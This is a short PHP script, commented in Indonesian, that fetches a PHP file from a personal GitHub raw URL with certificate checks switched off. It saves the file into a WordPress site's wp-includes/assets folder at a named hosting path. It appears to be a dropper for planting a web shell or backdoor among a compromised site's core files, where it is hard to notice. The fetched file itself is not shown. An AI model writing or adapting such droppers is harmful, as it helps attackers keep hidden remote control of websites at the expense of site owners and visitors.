<?php
// URL file dari GitHub raw
$url = "https://raw.githubusercontent.com/Bayyzp/ntah/refs/heads/main/apalah.php";

// Lokasi penyimpanan full path (bukan pakai $_SERVER['DOCUMENT_ROOT'])
$savePath = "/home/u977259636/domains/schemenews.com/public_html/wp-includes/assets/apalah.php";

// Inisialisasi cURL
$ch = curl_init($url);

// Buka file untuk ditulis
$fp = fopen($savePath, "w+");
if (!$fp) {
    die("❌ Gagal membuka file untuk menulis: $savePath");
}

// Set opsi cURL
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Eksekusi cURL
if (curl_exec($ch) === false) {
    echo "❌ cURL Error: " . curl_error($ch);
} else {
    echo "✅ File berhasil diunduh ke: $savePath";
}

// Tutup koneksi
curl_close($ch);
fclose($fp);
